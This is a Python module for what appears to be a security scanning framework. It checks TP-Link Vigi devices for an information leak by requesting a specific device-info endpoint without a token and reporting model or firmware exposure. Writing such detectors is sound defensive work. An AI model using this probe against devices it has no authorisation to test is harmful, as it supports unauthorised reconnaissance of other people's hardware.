import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "tplink/vigi_leak_scan"
        self.description = "Unauthenticated parameter and layout leaks detector for TP-Link Vigi commercial hardware."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/luci/;stok=/api/v1/system/device_info"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/luci/;stok=/api/v1/system/device_info"
            
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.get(url)
                if response.status_code == 200 and ("model" in response.text or "firmware" in response.text):
                    return {
                        "vulnerable": True,
                        "details": "TP-Link Vigi diagnostics exposure verified. System details are readable without token."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
